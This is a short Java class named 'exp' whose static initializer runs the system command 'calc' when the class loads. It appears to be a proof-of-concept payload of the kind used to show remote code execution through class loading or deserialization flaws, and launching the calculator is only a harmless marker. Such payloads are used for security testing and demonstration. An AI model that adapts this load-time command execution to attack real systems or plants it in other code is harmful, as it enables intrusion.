public class exp {
static {
    try {
        Runtime.getRuntime().exec("calc");
        } catch ( Exception e ) {
            e.printStackTrace();
        }
    }
}